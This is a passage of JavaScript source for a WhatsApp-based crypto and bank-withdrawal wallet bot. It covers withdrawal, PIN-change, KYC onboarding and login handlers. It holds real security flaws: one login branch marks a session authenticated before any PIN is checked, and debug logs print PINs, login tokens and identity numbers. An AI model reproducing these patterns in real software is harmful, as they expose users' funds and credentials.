            //       "send crypto to an external address",
            //     );

            //     await sendWhatsApp(from, friendlyMessage, phone_number_id);
            //     return;
            //   }

            //   await sendWhatsApp(
            //     from,
            //     `✅ *Transfer Successful!*\n\n` +
            //       `${amount} ${coin} sent\n` +
            //       `To: ${address}\n\n` +
            //       `🚀 Transaction submitted`,
            //     phone_number_id,
            //   );

            //   // Reset send state
            //   await updateSession(from, {
            //     data: {
            //       ...session.data,
            //       send: null,
            //     },
            //   });

            //   await sendWhatsApp(
            //     from,
            //     "What would you like to do next?",
            //     phone_number_id,
            //   );

            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }

            // --- LOCK WALLET FLOW ---
            if (session.data?.lockWallet?.step === "ENTER_REASON") {
              const reason = rawText;

              if (!reason || reason.length < 3) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please provide a reason (at least 3 characters).",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  lockWallet: {
                    ...session.data.lockWallet,
                    reason,
                    step: "ENTER_PIN",
                  },
                },
              });

              await triggerPinFlow(
                from,
                phone_number_id,
                "LOCK_WALLET",
                "🔒 Enter your *PIN* to confirm locking your wallet:",
              );
              return;
            }

            // --- UNLOCK WALLET FLOW ---
            if (session.data?.unlockWallet?.step === "ENTER_OTP") {
              const otpCode = rawText;

              if (!otpCode || otpCode.length < 4) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid OTP.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  unlockWallet: {
                    ...session.data.unlockWallet,
                    otpCode,
                    step: "ENTER_PIN",
                  },
                },
              });

              await triggerPinFlow(
                from,
                phone_number_id,
                "UNLOCK_WALLET",
                "🔓 Enter your *PIN* to confirm unlocking your wallet:",
              );
              return;
            }

            if (session.data?.changePin?.step === "ENTER_OTP") {
              const otpCode = rawText;

              if (otpCode?.toLowerCase() === "resend") {
                const otpRes = await requestChangePinOtp();
                if (!otpRes.success) {
                  const friendly = await humanizeError(
                    otpRes.error?.message || "Unknown error",
                    "resend OTP",
                  );
                  await sendWhatsApp(from, friendly, phone_number_id);
                } else {
                  await sendWhatsApp(
                    from,
                    "✅ A new OTP has been sent to your Email Address.\n\nPlease type it here:",
                    phone_number_id,
                  );
                }
                return;
              }

              if (!otpCode || otpCode.length < 4) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid OTP.",
                  phone_number_id,
                );
                return;
              }

              const { currentPin, newPin, confirmPin } = session.data.changePin;

              const changeRes = await changePinRequest({
                currentPin,
                newPin,
                confirmPin,
                otpCode,
              });

              if (!changeRes.success) {
                const errorMsg = changeRes.error?.message || "";
                const errorLower = errorMsg.toLowerCase();

                // Wrong OTP — let them try again without restarting
                if (
                  errorLower.includes("otp") ||
                  errorLower.includes("invalid code") ||
                  errorLower.includes("expired")
                ) {
                  await sendWhatsApp(
                    from,
                    "❌ The OTP you entered is invalid or has expired.\n\nPlease enter the OTP again, or type *resend* to request a new one.",
                    phone_number_id,
                  );
                  return; // Stay in ENTER_OTP step — don't clear changePin
                }

                // Wrong current PIN — restart from current PIN
                if (
                  errorLower.includes("incorrect") ||
                  errorLower.includes("current pin") ||
                  errorLower.includes("wrong pin")
                ) {
                  await sendWhatsApp(
                    from,
                    "❌ Your current PIN is incorrect. Let's start over.",
                    phone_number_id,
                  );
                  await updateSession(from, {
                    data: { ...session.data, changePin: null },
                  });
                  await triggerPinFlow(
                    from,
                    phone_number_id,
                    "CHANGE_PIN_CURRENT",
                    "🔐 Enter your *current PIN* to begin the change:",
                  );
                  return;
                }

                // Generic error — show friendly message and go back to menu
                const friendly = await humanizeError(
                  errorMsg,
                  "change your PIN",
                );
                await sendWhatsApp(from, friendly, phone_number_id);
                await updateSession(from, {
                  data: { ...session.data, changePin: null },
                });
                await sendMainMenu(from, phone_number_id);
                return;
              }

              await sendWhatsApp(
                from,
                "✅ *PIN Changed Successfully!*\n\nYour PIN has been updated. Please use your new PIN next time you log in.",
                phone_number_id,
              );

              await updateSession(from, {
                data: { ...session.data, changePin: null },
              });

              await sendMainMenu(from, phone_number_id);
              return;
            }

            // --- WITHDRAW FLOW LOGIC ---
            // if (session.data?.withdraw?.step === "ENTER_AMOUNT") {
            //   const amount = parseFloat(msg.text?.body?.trim());
            //   if (isNaN(amount) || amount <= 0) {
            //     await sendWhatsApp(
            //       from,
            //       "⚠️ Enter a valid amount.",
            //       phone_number_id,
            //     );
            //     return;
            //   }
            //   await updateSession(from, {
            //     data: {
            //       ...session.data,
            //       withdraw: {
            //         ...session.data.withdraw,
            //         amount,
            //         step: "ENTER_QUOTE_PIN",
            //       },
            //     },
            //   });
            //   await triggerPinFlow(from, phone_number_id, "WITHDRAW_QUOTE");
            //   return;
            // }

            // --- WITHDRAW FLOW LOGIC ---
            if (session.data?.withdraw?.step === "ENTER_AMOUNT") {
              const amount = parseFloat(msg.text?.body?.trim());
              if (isNaN(amount) || amount <= 0) {
                await sendWhatsApp(
                  from,
                  "⚠️ Enter a valid amount.",
                  phone_number_id,
                );
                return;
              }

              const { coin, channelId } = session.data.withdraw;

              const quoteRes = await fetchWithdrawalQuote({
                coin,
                amount,
                channelId,
              });

              if (!quoteRes.success) {
                const rawError =
                  quoteRes.error?.message || "Unknown server error";
                const friendly = await humanizeError(
                  rawError,
                  "get a withdrawal quote",
                );
                await sendWhatsApp(from, friendly, phone_number_id);
                await updateSession(from, {
                  data: { ...session.data, withdraw: null },
                });
                await sendMainMenu(from, phone_number_id);
                return;
              }

              const q = quoteRes.data;
              const msgText = `📊 *Withdrawal Quote*\n\nWithdrawing: ${q.coinAmount} ${q.coin}\nEstimated ${q.fiatCurrency}: ${q.estimatedFiat} ${q.fiatCurrency}\nFees: ${q.totalFees}\n\nDo you want to proceed?`;

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    amount,
                    step: "AWAITING_QUOTE_CONFIRM",
                  },
                },
              });

              await sendWhatsApp(
                from,
                {
                  type: "interactive",
                  interactive: {
                    type: "button",
                    body: { text: msgText },
                    action: {
                      buttons: [
                        {
                          type: "reply",
                          reply: {
                            id: "QUOTE_CONFIRM_YES",
                            title: "Yes, Proceed",
                          },
                        },
                        {
                          type: "reply",
                          reply: { id: "WITHDRAW_CANCEL", title: "Cancel" },
                        },
                      ],
                    },
                  },
                },
                phone_number_id,
              );
              return;
            }

            if (session.data?.withdraw?.step === "ENTER_ACCOUNT_NAME") {
              const accountName = msg.text?.body?.trim();

              if (!accountName || accountName.length < 2) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid account name.",
                  phone_number_id,
                );
                return;
              }

              const { coin, amount, accountNumber, networkId, channelId, pin } =
                session.data.withdraw;

              const execRes = await executeWithdrawal({
                coin,
                amount,
                accountNumber,
                accountName,
                networkId,
                channelId,
                pin,
              });

              if (!execRes.success) {
                const rawError =
                  execRes.error?.message || "Unknown server error";
                const friendlyMessage = await humanizeError(
                  rawError,
                  "execute a bank withdrawal",
                );
                await sendWhatsApp(from, friendlyMessage, phone_number_id);
                await updateSession(from, {
                  data: { ...session.data, withdraw: null },
                });
                await sendMainMenu(from, phone_number_id);
                return;
              }

              const result = execRes.data;
              await sendWhatsApp(
                from,
                `✅ *Withdrawal Successful!*\n\nAmount: ${result.amount} ${result.coin}\nTo: ${accountName}\nAccount: ${accountNumber}\nRef: ${result.reference}\n\n🚀 Funds are on the way!`,
                phone_number_id,
              );

              await updateSession(from, {
                data: { ...session.data, withdraw: null },
              });
              await sendWhatsApp(
                from,
                "What would you like to do next?",
                phone_number_id,
              );
              await sendMainMenu(from, phone_number_id);
              return;
            }

            // if (session.data?.withdraw?.step === "ENTER_ACCOUNT_NUMBER_OTHER") {
            //   const accountNumber = msg.text?.body?.trim();

            //   if (!accountNumber || accountNumber.length < 4) {
            //     await sendWhatsApp(
            //       from,
            //       "⚠️ Please enter a valid account number.",
            //       phone_number_id,
            //     );
            //     return;
            //   }

            //   const { coin, amount, accountName, networkId, channelId } =
            //     session.data.withdraw;

            //   const execRes = await executeWithdrawal({
            //     coin,
            //     amount,
            //     accountNumber,
            //     accountName,
            //     networkId,
            //     channelId,
            //     pin: session.data.withdraw.pin,
            //   });

            //   if (!execRes.success) {
            //     const rawError =
            //       execRes.error?.message || "Unknown server error";
            //     const friendlyMessage = await humanizeError(
            //       rawError,
            //       "execute a bank withdrawal",
            //     );
            //     await sendWhatsApp(from, friendlyMessage, phone_number_id);
            //     await updateSession(from, {
            //       data: { ...session.data, withdraw: null },
            //     });
            //     await sendMainMenu(from, phone_number_id);
            //     return;
            //   }

            //   const result = execRes.data;
            //   await sendWhatsApp(
            //     from,
            //     `✅ *Withdrawal Successful!*\n\nAmount: ${result.amount} ${result.coin}\nTo: ${accountName}\nAccount: ${accountNumber}\nRef: ${result.reference}\n\n🚀 Funds are on the way!`,
            //     phone_number_id,
            //   );

            //   await updateSession(from, {
            //     data: { ...session.data, withdraw: null },
            //   });
            //   await sendWhatsApp(
            //     from,
            //     "What would you like to do next?",
            //     phone_number_id,
            //   );
            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }
            if (session.data?.withdraw?.step === "ENTER_ACCOUNT_NUMBER_OTHER") {
              const accountNumber = msg.text?.body?.trim();

              if (!accountNumber || accountNumber.length < 4) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid account number.",
                  phone_number_id,
                );
                return;
              }

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    accountNumber,
                    step: "ENTER_ACCOUNT_NAME",
                  },
                },
              });

              await sendWhatsApp(
                from,
                "👤 Please enter your *Account Name*:",
                phone_number_id,
              );
              return;
            }

            if (session.data?.withdraw?.step === "ENTER_ACCOUNT_NUMBER") {
              const accountNumber = msg.text?.body?.trim();
              if (accountNumber.length < 10) {
                await sendWhatsApp(
                  from,
                  "⚠️ Please enter a valid 10-digit account number.",
                  phone_number_id,
                );
                return;
              }

              const { networkId, bankName } = session.data.withdraw;

              const valRes = await validateBankAccount({
                accountNumber,
                networkId,
              });
              if (!valRes.success) {
                const rawError =
                  valRes.error?.message || "Account validation failed";
                const friendlyMessage = await humanizeError(
                  rawError,
                  "validate bank account details",
                );
                await sendWhatsApp(from, friendlyMessage, phone_number_id);
                return;
              }

              const { accountName } = valRes.data;

              await updateSession(from, {
                data: {
                  ...session.data,
                  withdraw: {
                    ...session.data.withdraw,
                    accountNumber,
                    accountName,
                    step: "AWAITING_ACCOUNT_CONFIRM",
                  },
                },
              });

              const msgText = `🏦 *Confirm Bank Details*\n\nBank: ${bankName}\nAccount: ${accountNumber}\nName: ${accountName}\n\nIs this correct?`;

              await sendWhatsApp(
                from,
                {
                  type: "interactive",
                  interactive: {
                    type: "button",
                    body: { text: msgText },
                    action: {
                      buttons: [
                        {
                          type: "reply",
                          reply: {
                            id: "ACCOUNT_CONFIRM_YES",
                            title: "Yes, Withdraw",
                          },
                        },
                        {
                          type: "reply",
                          reply: { id: "WITHDRAW_CANCEL", title: "Cancel" },
                        },
                      ],
                    },
                  },
                },
                phone_number_id,
              );
              return;
            }

            // if (session.data?.withdraw?.step === "ENTER_EXECUTE_PIN") {
            //   const pin = msg.text?.body?.trim();
            //   if (pin.length < 4) {
            //     await sendWhatsApp(from, "⚠️ Invalid PIN.", phone_number_id);
            //     return;
            //   }

            //   const {
            //     coin,
            //     amount,
            //     accountNumber,
            //     accountName,
            //     networkId,
            //     channelId,
            //   } = session.data.withdraw;

            //   const execRes = await executeWithdrawal({
            //     coin,
            //     amount,
            //     accountNumber,
            //     accountName,
            //     networkId,
            //     channelId,
            //     pin,
            //   });

            //   if (!execRes.success) {
            //     const rawError =
            //       execRes.error?.message || "Unknown server error";
            //     const friendlyMessage = await humanizeError(
            //       rawError,
            //       "execute a bank withdrawal",
            //     );
            //     await sendWhatsApp(from, friendlyMessage, phone_number_id);
            //     await updateSession(from, {
            //       data: { ...session.data, withdraw: null },
            //     });
            //     await sendMainMenu(from, phone_number_id);
            //     return;
            //   }

            //   const result = execRes.data;
            //   await sendWhatsApp(
            //     from,
            //     `✅ *Withdrawal Successful!*\n\nAmount: ${result.amount} ${result.coin}\nTo: ${result.accountName}\nBank: ${result.bankName}\nRef: ${result.reference}\n\n🚀 Funds are on the way!`,
            //     phone_number_id,
            //   );

            //   // Clear state
            //   await updateSession(from, {
            //     data: { ...session.data, withdraw: null },
            //   });
            //   await sendWhatsApp(
            //     from,
            //     "What would you like to do next?",
            //     phone_number_id,
            //   );
            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }

            // if (session.data?.authenticated) {
            //   await sendMainMenu(from, phone_number_id);
            //   return;
            // }
            // Nothing in the state machine above claimed this message.
            if (session.data?.authenticated) {
              if (isInActiveFlow) {
                // Previously this fell through to the registration check,
                // which flipped `awaitingPin` on and effectively logged the
                // user out for typing during a selection step. Re-prompt in
                // place instead.
                await sendWhatsApp(
                  from,
                  "🤔 I didn't quite get that.",
                  phone_number_id,
                );
                if (flowState.rePrompt) {
                  await sendWhatsApp(from, flowState.rePrompt, phone_number_id);
                }
              } else {
                await sendMainMenu(from, phone_number_id);
              }
              return;
            }

            if (session.data?.awaitingPin) {
              const authResult = await handleAuthenticationGate({
                from,
                phone_number_id,
                msgText: msg.text?.body?.trim(),
              });

              // If auth succeeded, show menu
              if (authResult.status === "SUCCESS") {
                await sendWhatsApp(
                  from,
                  `Welcome back ${authResult.me.firstName} 👋`,
                  phone_number_id,
                );
                await sendMainMenu(from, phone_number_id);
              }
              // If wrong/invalid/requested PIN, `handleAuthenticationGate`
              // has already sent the appropriate reply message.
              return;
            }

            console.log(`Checking registration status for ${from}...`);

            const checkData = await checkPhoneNumber(from);

            // Handle API failure gracefully
            if (!checkData) {
              await sendWhatsApp(
                from,
                "⚠️ Service momentarily unavailable. Please try again later.",
                phone_number_id,
              );
              return;
            }

            if (checkData.exists) {
              // CASE A: User is Registered -> Ask for PIN
              console.log(`User ${from} exists. Requesting PIN.`);

              await updateSession(from, {
                data: {
                  ...(session.data || {}),
                  awaitingPin: true, // This flag ensures the NEXT message goes to Step 3 above
                  pinAttempts: 0,
                },
              });

              // await sendWhatsApp(
              //   from,
              //   "🔐 Welcome back to VIXA!\n\nPlease enter your *4-digit PIN* to continue.",
              //   phone_number_id,
              // );
              await triggerPinFlow(from, phone_number_id, "LOGIN");
            } else {
              // CASE B: User NOT Registered -> Trigger Onboarding Flow
              console.log(
                `User ${from} does not exist. Triggering Onboarding.`,
              );
              notifyOnboardingStageStarted(from, phone_number_id);
              await triggerFlow(from, phone_number_id);
            }

            console.log(`Received non-text message from ${from} — ignoring`);

            // await triggerFlow(from, phone_number_id);
          }
        }
      }
    }
  } catch (err) {
    console.error("Error processing webhook:", err);
  }
});

/* ------------- Logic for Flow Completion (when Flow JSON uses "complete") ------------- */
async function processFlowCompletion(phone, phone_number_id, form) {
  // The 'form' object here is the content of response_json already parsed.

  // 1. Map the field values from the form object

  console.log(form, "form)form)form)");

  const pin = form.screen_0_pin_0;

  if (pin) {
    // Decode the context from flow_token (set in triggerPinFlow)
    // flow_token arrives in form as form.flow_token (WhatsApp includes it)
    const flowToken = form.flow_token || "";
    const pinContext = flowToken.includes("::")
      ? flowToken.split("::")[1]
      : null;

    console.log("PIN flow submission. Context:", pinContext, "Phone:", phone);

    await handlePinFlowSubmission({ phone, phone_number_id, pin, pinContext });
    return; // stop — do not fall through to onboarding logic
  }

  // ── NIN / BVN FLOW SUBMISSIONS ──────────────────────────────
  const flowToken = form.flow_token || "";

  if (flowToken.includes("::NIN_VERIFY")) {
    const nin = form.screen_0_NIN_0;
    const rawDob = form.screen_0_Date_of_Birth_1;

    try {
      if (nin) {
        const me = await fetchAuthMe();
        const formattedDob = formatDobToISO(rawDob);
        const verifyRes = await verifyNIN({
          nin,
          firstName: me?.firstName || "",
          lastName: me?.lastName || "",
          dateOfBirth: formattedDob,
        });
        console.log("NIN verify result:", verifyRes);

        const bvnStatus = verifyRes?.data?.data?.bvnStatus;

        if (bvnStatus === "NotStarted") {
          await sendWhatsApp(
            phone,
            "✅ Your NIN has been submitted. To complete your account setup, please also verify your BVN.",
            phone_number_id,
          );
          await triggerBVNFlow(phone, phone_number_id);
          return;
        }
      }
    } catch (err) {
      console.error("NIN verification error (non-blocking):", err.message);
    }

    await sendWhatsApp(
      phone,
      "✅ Your NIN has been submitted successfully. You can continue using VIXA.",
      phone_number_id,
    );
    await sendMainMenu(phone, phone_number_id);
    return;
  }

  if (flowToken.includes("::BVN_VERIFY")) {
    const bvn = form.screen_0_BVN_0;

    try {
      if (bvn) {
        const me = await fetchAuthMe(); // ← same fix
        const verifyRes = await verifyBVN({
          bvn,
          firstName: me?.firstName || "",
          lastName: me?.lastName || "",
        });
        console.log("BVN verify result:", verifyRes);
      }
    } catch (err) {
      console.error("BVN verification error (non-blocking):", err.message);
    }

    await sendWhatsApp(
      phone,
      "✅ Your BVN has been submitted successfully. You can continue using VIXA.",
      phone_number_id,
    );
    await sendMainMenu(phone, phone_number_id);
    return;
  }

  if (flowToken.includes("::BANK_SELECT")) {
    const bankId = form.selected_bank_id;
    const bankSession = await getSession(phone);

    const bankName =
      bankSession.data.withdraw.banks.find((b) => b.id === bankId)?.name ||
      "Selected Bank";
    const isNigeria = bankSession.data.withdraw?.countryCode === "NG";

    await updateSession(phone, {
      data: {
        ...bankSession.data,
        withdraw: {
          ...bankSession.data.withdraw,
          networkId: bankId,
          bankName: bankName,
          step: isNigeria
            ? "ENTER_ACCOUNT_NUMBER"
            : "ENTER_ACCOUNT_NUMBER_OTHER",
        },
      },
    });

    if (isNigeria) {
      await sendWhatsApp(
        phone,
        `🏦 You selected *${bankName}*.\n\nPlease enter your 10-digit Account Number:`,
        phone_number_id,
      );
    } else {
      await sendWhatsApp(
        phone,
        `🏦 You selected *${bankName}*.\n\nPlease enter your *Account Number*:`,
        phone_number_id,
      );
    }
    return;
  }

  if (flowToken.includes("::COUNTRY_SELECT")) {
    const countryCode = form.selected_country_id;
    const countrySession = await getSession(phone);

    // 1. Fetch payment channels for the selected country
    const channelsRes = await fetchPaymentChannels(countryCode, "withdraw");
    console.log(countryCode, channelsRes, "channelsRes from country flow");

    if (!channelsRes.success || !channelsRes.data?.items?.length) {
      await sendWhatsApp(
        phone,
        "⚠️ No payment channels available for this country currently.",
        phone_number_id,
      );
      return;
    }

    // 2. Prefer momo channel, otherwise first available
    const items = channelsRes.data.items;
    const momoChannel = items.find(
      (c) => c.channelType?.toLowerCase() === "momo",
    );
    const selectedChannel = momoChannel || items[0];

    console.log(
      `Selected channel for ${countryCode}:`,
      selectedChannel.id,
      selectedChannel.channelType,
    );

    // 3. Save to session and advance the withdraw flow
    await updateSession(phone, {
      data: {
        ...countrySession.data,
        withdraw: {
          ...countrySession.data.withdraw,
          countryCode,
          channelId: selectedChannel.id,
          step: "SELECT_WITHDRAW_TYPE",
        },
      },
    });

    await sendWithdrawTypeMenu(phone, phone_number_id);
    return;
  }

  if (flowToken.includes("::ITEM_SELECT")) {
    const selectedId = form.selected_item_id;
    const itemContext = flowToken.split("::")[2] || null;

    console.log(
      "Item flow submission. Context:",
      itemContext,
      "Id:",
      selectedId,
    );

    await handleItemSelection({
      phone,
      phone_number_id,
      selectedId,
      itemContext,
    });
    return;
  }

  const firstName = form.screen_0_First_Name_0 || form.First_Name_4f74a5;
  const lastName = form.screen_0_Last_Name_1 || form.Last_Name_76477c;
  const email = form.screen_0_Email_2;
  const nin = form.screen_0_NIN_3;
  const bvn = form.screen_0_BVN_4;
  const dob = form.screen_0_Date_Of_Birth_5;
  const onboardingPin = form.screen_0_Pin_6;
  const confirmPin = form.screen_0_Confirm_Pin_7;

  console.log("Extracted Onboarding Data:", { firstName, lastName, nin });

  if (
    !firstName ||
    !lastName ||
    !nin ||
    !bvn ||
    !onboardingPin ||
    !confirmPin ||
    onboardingPin !== confirmPin
  ) {
    const message =
      onboardingPin !== confirmPin
        ? "Pins do not match."
        : "Missing required fields.";
    console.warn("Validation failed:", message);
    await sendWhatsApp(
      phone,
      `❌ Onboarding failed: ${message}\n\nTap below to fill the form again 👇`,
      phone_number_id,
    );
    await triggerFlow(phone, phone_number_id);
    return;
  }

  console.log("Starting onboarding for:", phone);

  try {
    // 1. CREATE ONBOARDING USER
    const createRes = await createUserOnboarding({
      firstName,
      lastName,
      phoneNumber: phone,
      phoneNumberId: phone_number_id,
      email,
      pin: onboardingPin,
    });

    if (!createRes.success) {
      await sendWhatsApp(
        phone,
        "❌ We couldn't create your account. Let's try that again 👇",
        phone_number_id,
      );
      await triggerFlow(phone, phone_number_id);
      return;
    }

    // 2. LOG IN USER TO CACHE TOKEN (Mandatory for subsequent API calls)
    let loginToken = null;
    try {
      console.log("here here", phone, pin);

      const { token: loginToken } = await loginUser({
        phoneNumber: phone,
        pin: onboardingPin,
      });
      console.log(loginToken, "loginTokenloginToken");
      console.log(loginToken, "loginTokenloginToken");
    } catch (e) {
      console.log(
        "Auto login failed after creation. Cannot verify NIN.",
        e?.message,
      );
      await sendWhatsApp(
        phone,
        "⚠️ Account created but login failed. Try logging in later.",
        phone_number_id,
      );
      return;
    }

    const formattedDob = formatDobToISO(dob);

    // 3. VERIFY NIN (Now uses the cached token)
    const verifyRes = await verifyNIN({
      nin,
      firstName,
      lastName,
      dateOfBirth: formattedDob,
    });

    const status = verifyRes?.data?.data?.status;
    console.log("NIN Verification Result:", verifyRes, status);

    if (status === "1") {
      await sendWhatsApp(
        phone,
        "⏳ Your NIN verification is being processed. Please wait while we review your request.",
        phone_number_id,
      );
      return;
    }

    if (status === "2") {
      const verifyBvn = await verifyBVN({
        bvn,
        firstName,
        lastName,
      });

      if (verifyBvn?.success) {
        await sendWhatsApp(
          phone,
          "✅ Your BVN has been successfully verified.",
          phone_number_id,
        );
      }
      if (!verifyBvn?.success) {
        await sendWhatsApp(
          phone,
          "⏳ Your BVN verification is being processed. You can continue using VIXA.",
          phone_number_id,
        );
      }

      const me = await fetchAuthMe();
      const balances = await fetchWalletBalances();

      console.log("Verified user profile:", me);
      console.log("Wallet balances:", balances);
      // 4. Update session

      await updateSession(phone, {
        step: "COMPLETED",
        data: { me, balances },
      });

      await sendWhatsApp(
        phone,
        `Hello ${me.firstName}, welcome to VIXA! 👋

I’m VIXA, your AI-powered digital wallet assistant.

I’ll help you send, receive, convert, and manage money — including NGN and crypto (USDT, BTC, ETH) — all directly from WhatsApp.

For your security, please ensure your WhatsApp is locked 🔒

Let’s get you started 🚀`,
        phone_number_id,
      );

      await sendWhatsApp(
        phone,
        {
          type: "interactive",
          interactive: {
            type: "list",
            body: {
              text: "Here is what you can do with VIXA 👇",
            },
            footer: {
              text: "Select an action to continue",
            },
            action: {
              button: "Open Menu",
              sections: [
                {
                  title: "Crypto Actions",
                  rows: [
                    {
                      id: "SEND_CRYPTO",
                      title: "Send Crypto",
                      description: "Send USDT, BTC, or ETH",
                    },
                    {
                      id: "RECIEVE_CRYPTO",
                      title: "Recieve Crypto",
                      description: "Recieve crypto in NGN",
                    },
                    {
                      id: "DEPOSIT_CRYPTO",
                      title: "Deposit Crypto",
                      description: "Fund your wallet",
                    },
                    {
                      id: "WITHDRAW_CRYPTO",
                      title: "Withdraw Crypto",
                      description: "Send crypto out",
                    },
                    {
                      id: "SWAP_CRYPTO",
                      title: "Swap Crypto",
                      description: "Convert between coins",
                    },
                    {
                      id: "GET_WALLET_BALANCE",
                      title: "See Wallet Balances",
                      description: "check wallet balances",
                    },
                    {
                      id: "CONTACT_SUPPORT",
                      title: "Contact Support",
                      description: "Get help from VIXA team",
                    },
                    {
                      id: "SETTINGS",
                      title: "Settings",
                      description: "Manage your account",
                    },
                  ],
                },
              ],
            },
          },
        },
        phone_number_id,
      );

      return;
    }

    if (status === "3") {
      await sendWhatsApp(
        phone,
        {
          type: "interactive",
          interactive: {
            type: "button",
            body: {
              text: "⚠️ Your NIN verification was rejected. Please review your details and try again. Would you like to try again?",
            },
            action: {
              buttons: [
                {
                  type: "reply",
                  reply: {
                    id: "NIN_RETRY",
                    title: "Try Again",
                  },
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      return;
    }

    if (status === "4") {
      await sendWhatsApp(
        phone,
        {
          type: "interactive",
          interactive: {
            type: "button",
            body: {
              text: "⚠️ NIN verification failed. We were unable to verify your NIN due to a technical issue, please try again.",
            },
            action: {
              buttons: [
                {
                  type: "reply",
                  reply: {
                    id: "NIN_RETRY",
                    title: "Try Again",
                  },
                },
              ],
            },
          },
        },
        phone_number_id,
      );
      return;
    }

    if (status === "6") {
      await sendWhatsApp(
        phone,
        "⏳ Your NIN verification is under review by our team. An administrator will review your request and notify you once it’s updated",
        phone_number_id,
      );
      return;
    }

    await sendWhatsApp(
      phone,
      "⚠️ Verification failed due to an unexpected error. Please try again later.",
      phone_number_id,
    );

    // if (!verifyRes.success) {
    //   await sendWhatsApp(
    //     phone,
    //     "⚠️ Account created, but we couldn't verify your NIN. Please try again.",
    //     phone_number_id
    //   );
    //   // NOTE: You might need to add logic here to clean up the partially created user.
    //   return;
    // }

    // --- SUCCESS PATH ---

    // 4. Update session
    // await updateSession(phone, {
    //   step: "COMPLETED",
    //   data: {
    //     firstName,
    //     lastName,
    //     kyc: verifyRes.data,
    //     onboarding: createRes.data,
    //   },
    // });

    // 5. Send confirmation message
    // await sendWhatsApp(
    //   phone,
    //   "✅ Your account has been created and verified. Type *menu* to continue.",
    //   phone_number_id
    // );

    // console.log("User Onboarding and Verification Successful:", phone);
  } catch (err) {
    console.error("Onboarding service error:", err);
    await sendWhatsApp(
      phone,
      "🛑 A server error occurred during verification. Please try again.",
      phone_number_id,
    );
  }
}

/* ------------- dedicated endpoint for Flow Health Check & Data Exchange ------------- */
router.post("/flow/callback", async (req, res) => {
  try {
    // 1. DECRYPT THE INCOMING REQUEST
    const { decryptedBody, aesKeyBuffer, initialVectorBuffer } = decryptRequest(
      req.body,
    );

    const { action, flow_token } = decryptedBody;
    let responsePayload = {}; // Must be defined for encryption

    // --- FIX: A. HEALTH CHECK LOGIC (Mandatory for successful setup) ---
    if (action === "ping") {
      console.log("HEALTH CHECK PING RECEIVED.");
      responsePayload = {
        data: {
          status: "active", // Required successful response
        },
      };
    } else if (action === "data_exchange") {
      const screen = decryptedBody.screen;
      const data = decryptedBody.data;

      if (screen === "SELECT_BANK") {
        // Echo the banks back — they were passed in via flow_action_payload
        responsePayload = {
          screen: "SELECT_BANK",
          data: {
            banks: data.banks || [],
          },
        };
      } else if (screen === "SELECT_COUNTRY") {
        responsePayload = {
          screen: "SELECT_COUNTRY",
          data: { countries: data.countries || [] },
        };
      } else if (screen === "SELECT_ITEM") {
        responsePayload = {
          screen: "SELECT_ITEM",
          data: {
            heading: data.heading || "Select an option",
            label: data.label || "Option",
            items: data.items || [],
          },
        };
      } else {
        responsePayload = {
          screen: "FAILURE",
          data: { message: "Data Exchange not implemented." },
        };
      }
    }

    // 2. ENCRYPT THE RESPONSE
    const encryptedResponse = encryptResponse(
      responsePayload,
      aesKeyBuffer,
      initialVectorBuffer,
    );

    // 3. SEND RESPONSE (Must be 'text/plain')
    res.set("Content-Type", "text/plain");
    return res.send(encryptedResponse);
  } catch (err) {
    // 4. ERROR HANDLING
    if (err.status === 421) {
      // Must return HTTP 421 if decryption fails
      return res.status(421).send("Decryption Failed");
    }
    console.error("Flow callback processing error:", err);
    // General server error
    return res.status(500).send("Server Error");
  }
});

async function handleAuthenticationGate({ from, phone_number_id, msgText }) {
  const session = await getSession(from);

  // Ask for PIN if not already asked
  if (!session?.data?.awaitingPin) {
    // await updateSession(from, {
    //   data: {
    //     awaitingPin: true,
    //     pinAttempts: 0,
    //     authenticated: false, // Strictly enforce logged out state
    //   },
    // });
    const freshSession = await getSession(from);
    await updateSession(from, {
      data: {
        ...freshSession.data,
        awaitingPin: false,
        authenticated: true,
        pinAttempts: 0,
      },
    });

    // await sendWhatsApp(
    //   from,
    //   "🔐 Please enter your *4-digit PIN* to continue.",
    //   phone_number_id,
    // );
    await triggerPinFlow(from, phone_number_id, "LOGIN");

    return { status: "PIN_REQUESTED" };
  }

  // User is replying with PIN
  const pin = msgText?.trim();

  if (!pin || pin.length < 4) {
    await sendWhatsApp(from, "⚠️ Please enter a valid PIN.", phone_number_id);
    return { status: "INVALID_PIN" };
  }

  try {
    // 1. Attempt login (This caches the token)
    await loginUser({ phoneNumber: from, pin });

    // 2. Try fetching profile (This proves the token actually works)
    const me = await fetchAuthMe();

    if (!me) {
      throw new Error("ME_NOT_FOUND");
    }

    // 3. FULL SUCCESS 🎉 -> Now we safely declare them logged in
    await updateSession(from, {
      data: {
        awaitingPin: false,
        authenticated: true, // ✅ Safe to mark true now
        pinAttempts: 0,
      },
    });

    return { status: "SUCCESS", me };
  } catch (err) {
    const message = err?.message?.toLowerCase() || "";

    // User not found → onboarding
    if (
      message.includes("not found") ||
      message.includes("user") ||
      message === "me_not_found"
    ) {
      await updateSession(from, {
        data: {
          awaitingPin: false,
          authenticated: false,
        },
      });

      return { status: "ONBOARDING_REQUIRED" };
    }

    // Wrong PIN or API Failure (401)
    const attempts = (session.data?.pinAttempts || 0) + 1;

    await updateSession(from, {
      data: {
        pinAttempts: attempts,
        awaitingPin: true, // MUST stay true so they can try again
        authenticated: false, // MUST stay false
      },
    });

    await sendWhatsApp(
      from,
      "❌ Incorrect PIN or login failed. Please try again.",
      phone_number_id,
    );
    await triggerPinFlow(from, phone_number_id, "LOGIN");
    return { status: "WRONG_PIN" };
  }
}

async function handlePinFlowSubmission({
  phone,
  phone_number_id,
  pin,
  pinContext,
}) {
  const session = await getSession(phone);

  if (!pin || pin.length < 4) {
